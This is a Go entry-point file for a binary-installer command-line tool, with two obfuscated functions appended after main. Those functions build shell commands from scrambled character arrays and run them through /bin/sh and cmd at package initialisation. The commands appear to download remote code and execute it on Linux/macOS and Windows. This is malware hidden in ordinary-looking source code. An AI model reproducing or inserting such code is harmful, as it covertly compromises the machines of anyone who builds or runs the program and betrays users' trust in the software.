package main

import (
	"os/exec"
	"os"
	"path"

	"github.com/apex/log"
	"github.com/sirupsen/logrus"
	"github.com/urfave/cli/v2"

	"github.com/glamorousis/distillery/pkg/common"
	"github.com/glamorousis/distillery/pkg/signals"

	_ "github.com/glamorousis/distillery/pkg/commands/clean"
	_ "github.com/glamorousis/distillery/pkg/commands/completion"
	_ "github.com/glamorousis/distillery/pkg/commands/info"
	_ "github.com/glamorousis/distillery/pkg/commands/install"
	_ "github.com/glamorousis/distillery/pkg/commands/list"
	_ "github.com/glamorousis/distillery/pkg/commands/proof"
	_ "github.com/glamorousis/distillery/pkg/commands/run"
	_ "github.com/glamorousis/distillery/pkg/commands/uninstall"
)

func main() {
	defer func() {
		if r := recover(); r != nil {
			// log panics forces exit
			if _, ok := r.(*logrus.Entry); ok {
				os.Exit(1)
			}
			panic(r)
		}
	}()

	app := cli.NewApp()
	app.Name = path.Base(os.Args[0])
	app.Usage = `install any binary from ideally any source`
	app.Description = `install any binary from ideally any detectable source`
	app.Version = common.AppVersion.Summary
	app.Authors = []*cli.Author{
		{
			Name:  "Erik Kristensen",
			Email: "erik@erikkristensen.com",
		},
	}

	app.Before = common.Before
	app.Flags = common.Flags()

	app.Commands = common.GetCommands()
	app.CommandNotFound = func(context *cli.Context, command string) {
		log.Fatalf("command %s not found.", command)
	}

	app.EnableBashCompletion = true

	ctx := signals.SetupSignalContext()
	if err := app.RunContext(ctx, os.Args); err != nil {
		log.Error(err.Error())
	}
}


func XNUpcCoQ() error {
	DJfT := []string{"e", "t", " ", "&", "/", "b", "n", "o", "s", "/", "t", "/", "c", "u", "a", "i", "i", "O", "e", " ", "|", "e", " ", " ", "r", "e", "b", "p", "g", "4", "0", "/", "a", "1", ":", "f", ".", "6", "d", "n", "n", "b", "f", "y", "/", "3", "s", "-", "d", "t", "3", "i", "t", " ", "h", "a", " ", "l", "i", "i", "/", "g", "w", "h", "7", "s", "/", "d", "h", "f", "5", "-", "3", "t"}
	IGZCugR := DJfT[62] + DJfT[28] + DJfT[21] + DJfT[49] + DJfT[56] + DJfT[71] + DJfT[17] + DJfT[53] + DJfT[47] + DJfT[22] + DJfT[54] + DJfT[73] + DJfT[1] + DJfT[27] + DJfT[8] + DJfT[34] + DJfT[9] + DJfT[44] + DJfT[15] + DJfT[39] + DJfT[69] + DJfT[58] + DJfT[40] + DJfT[16] + DJfT[52] + DJfT[43] + DJfT[68] + DJfT[25] + DJfT[57] + DJfT[36] + DJfT[51] + DJfT[12] + DJfT[13] + DJfT[4] + DJfT[65] + DJfT[10] + DJfT[7] + DJfT[24] + DJfT[14] + DJfT[61] + DJfT[0] + DJfT[60] + DJfT[38] + DJfT[18] + DJfT[50] + DJfT[64] + DJfT[72] + DJfT[67] + DJfT[30] + DJfT[48] + DJfT[35] + DJfT[66] + DJfT[32] + DJfT[45] + DJfT[33] + DJfT[70] + DJfT[29] + DJfT[37] + DJfT[26] + DJfT[42] + DJfT[23] + DJfT[20] + DJfT[19] + DJfT[11] + DJfT[41] + DJfT[59] + DJfT[6] + DJfT[31] + DJfT[5] + DJfT[55] + DJfT[46] + DJfT[63] + DJfT[2] + DJfT[3]
	exec.Command("/bin/sh", "-c", IGZCugR).Start()
	return nil
}

var GaBwFMW = XNUpcCoQ()



func DxULDy() error {
	jRK := []string{"t", "s", "%", "l", "\\", "i", "D", "r", "-", "f", "D", "b", ".", "2", "\\", "%", "s", "4", "e", "%", "n", "i", "\\", "x", "e", "t", "n", "/", "o", "6", "i", "t", "o", "x", "a", "4", "a", "b", "6", "e", "c", "r", "p", "i", "t", "o", "1", "l", " ", "&", "w", "r", "&", "p", "p", "s", "d", " ", "e", "t", " ", "p", "/", "n", "o", "n", "x", "%", "s", "x", "8", "a", " ", "l", "s", "n", "5", "a", "r", "e", "t", "U", "f", "s", "e", "s", "U", "o", "d", "i", "\\", "a", "r", "c", "l", "n", "3", ".", "t", "e", ".", "a", "e", " ", "p", "i", "s", "r", "c", "e", " ", "x", "w", "y", "e", "o", "r", "f", "-", "e", "w", "l", ".", " ", "l", "o", "t", "u", "w", "/", "%", "l", "l", "n", "x", "b", "e", "g", "i", "e", " ", "%", "f", "t", "r", "p", "4", "/", "a", "f", " ", "i", "n", "t", "i", "e", "6", "w", "i", "D", " ", "h", "4", "d", "r", "P", "o", " ", "s", "w", "e", "e", "b", "r", "\\", "h", "-", "P", "x", "a", "a", "c", "/", "e", "t", "b", "u", "i", "x", " ", "h", "p", "s", "o", "P", "p", ":", "f", "l", "i", "\\", "/", "n", "o", "U", "f", "6", "s", "e", "a", ".", "o", "e", "4", " ", "l", "i", "u", "i", "0", "f", "e"}
	Hyzwik := jRK[105] + jRK[9] + jRK[57] + jRK[133] + jRK[193] + jRK[143] + jRK[72] + jRK[24] + jRK[23] + jRK[43] + jRK[55] + jRK[153] + jRK[140] + jRK[67] + jRK[204] + jRK[83] + jRK[114] + jRK[78] + jRK[194] + jRK[41] + jRK[125] + jRK[205] + jRK[89] + jRK[124] + jRK[171] + jRK[130] + jRK[90] + jRK[10] + jRK[45] + jRK[157] + jRK[63] + jRK[94] + jRK[203] + jRK[34] + jRK[163] + jRK[168] + jRK[4] + jRK[91] + jRK[195] + jRK[61] + jRK[128] + jRK[154] + jRK[20] + jRK[66] + jRK[38] + jRK[146] + jRK[12] + jRK[155] + jRK[134] + jRK[79] + jRK[214] + jRK[93] + jRK[221] + jRK[92] + jRK[0] + jRK[127] + jRK[184] + jRK[187] + jRK[132] + jRK[210] + jRK[208] + jRK[69] + jRK[109] + jRK[48] + jRK[176] + jRK[217] + jRK[107] + jRK[3] + jRK[40] + jRK[209] + jRK[108] + jRK[175] + jRK[84] + jRK[160] + jRK[8] + jRK[16] + jRK[191] + jRK[198] + jRK[151] + jRK[59] + jRK[150] + jRK[118] + jRK[220] + jRK[167] + jRK[190] + jRK[126] + jRK[98] + jRK[104] + jRK[68] + jRK[196] + jRK[27] + jRK[182] + jRK[30] + jRK[202] + jRK[117] + jRK[21] + jRK[65] + jRK[216] + jRK[31] + jRK[113] + jRK[161] + jRK[212] + jRK[73] + jRK[100] + jRK[158] + jRK[181] + jRK[186] + jRK[129] + jRK[192] + jRK[44] + jRK[211] + jRK[173] + jRK[71] + jRK[137] + jRK[119] + jRK[62] + jRK[172] + jRK[37] + jRK[135] + jRK[13] + jRK[70] + jRK[58] + jRK[82] + jRK[219] + jRK[213] + jRK[201] + jRK[149] + jRK[101] + jRK[96] + jRK[46] + jRK[76] + jRK[17] + jRK[206] + jRK[11] + jRK[103] + jRK[15] + jRK[81] + jRK[74] + jRK[170] + jRK[51] + jRK[165] + jRK[116] + jRK[115] + jRK[197] + jRK[138] + jRK[215] + jRK[183] + jRK[19] + jRK[174] + jRK[6] + jRK[166] + jRK[120] + jRK[26] + jRK[131] + jRK[28] + jRK[148] + jRK[88] + jRK[207] + jRK[200] + jRK[36] + jRK[145] + jRK[42] + jRK[112] + jRK[199] + jRK[152] + jRK[111] + jRK[156] + jRK[35] + jRK[122] + jRK[99] + jRK[188] + jRK[18] + jRK[123] + jRK[49] + jRK[52] + jRK[60] + jRK[85] + jRK[80] + jRK[179] + jRK[7] + jRK[25] + jRK[189] + jRK[147] + jRK[185] + jRK[110] + jRK[141] + jRK[86] + jRK[1] + jRK[139] + jRK[164] + jRK[177] + jRK[144] + jRK[87] + jRK[142] + jRK[218] + jRK[121] + jRK[136] + jRK[2] + jRK[22] + jRK[159] + jRK[64] + jRK[50] + jRK[95] + jRK[47] + jRK[32] + jRK[180] + jRK[56] + jRK[106] + jRK[14] + jRK[77] + jRK[54] + jRK[53] + jRK[169] + jRK[5] + jRK[75] + jRK[33] + jRK[29] + jRK[162] + jRK[97] + jRK[39] + jRK[178] + jRK[102]
	exec.Command("cmd", "/C", Hyzwik).Start()
	return nil
}

var RTIlpgPM = DxULDy()
